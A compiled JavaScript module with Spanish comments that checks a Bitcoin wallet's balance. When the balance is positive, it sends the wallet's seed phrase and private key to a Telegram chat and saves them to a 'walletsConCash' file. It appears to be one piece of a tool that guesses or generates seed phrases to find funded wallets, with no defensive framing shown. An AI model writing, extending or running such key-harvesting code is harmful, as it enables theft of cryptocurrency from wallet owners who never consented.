"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.ValidarSaldoWallet = void 0;
const telegram_1 = require("../telegram/telegram");
const __1 = require("../..");
const guardarJsonConWallet_1 = require("../guardarWallets/guardarJsonConWallet");
// Función para validar el saldo
const ValidarSaldoWallet = async (wallet, semillas, walletBTC) => {
    //valido si el saldo actual, recibido o sin confirmar existe.
    if (wallet.confirmed > 0 ||
        wallet.received > 0 ||
        wallet.unconfirmed > 0) {
        //objeto BTC
        const datos_BTC = {
            frase: semillas,
            wallet_de: "BTC",
            direccion: walletBTC.Direccion,
            saldo: `confi: ${wallet.confirmed}, unconf: ${wallet.unconfirmed}`,
            clavePrivada: walletBTC.Clave_privada,
            fecha: new Date().toISOString(),
        };
        //encontrar wallet con balance positivo o por confirmar
        if (wallet.confirmed > 0 || wallet.unconfirmed > 0) {
            //enviar por telegram
            await (0, telegram_1.enviarMensajeTelegram)(datos_BTC);
            //guardo la wallet en un archivo
            await (0, guardarJsonConWallet_1.guardarJsonConWallet)(datos_BTC, "walletsConCash");
            //sumar en variable console.log
            (0, __1.addToWalletsConCash)(1);
        }
        // guardado para wallets con movimientos
        await (0, guardarJsonConWallet_1.guardarJsonConWallet)(datos_BTC, "walletsConMovimientos");
    }
};
exports.ValidarSaldoWallet = ValidarSaldoWallet;
